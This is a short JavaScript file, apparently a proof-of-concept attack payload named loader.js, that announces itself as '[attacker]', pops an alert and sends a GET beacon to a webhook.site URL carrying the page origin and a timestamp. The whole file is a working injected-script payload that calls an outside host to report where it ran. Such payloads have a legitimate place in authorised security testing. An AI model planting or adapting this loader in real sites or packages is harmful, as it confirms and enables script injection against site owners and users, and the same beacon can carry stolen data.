const EXFIL = "https://webhook.site/55ba3434-91a8-49ee-993d-42e54f4fb6a3";

(function () {
  const origin = window.location.origin;
  console.warn("[attacker] loader.js executed in:", origin);


  alert("loader.js executed in " + origin);

  fetch(EXFIL + "?stage=loader_exec&origin=" + encodeURIComponent(origin) +
                "&ts=" + Date.now(), { method: "GET" });
})();
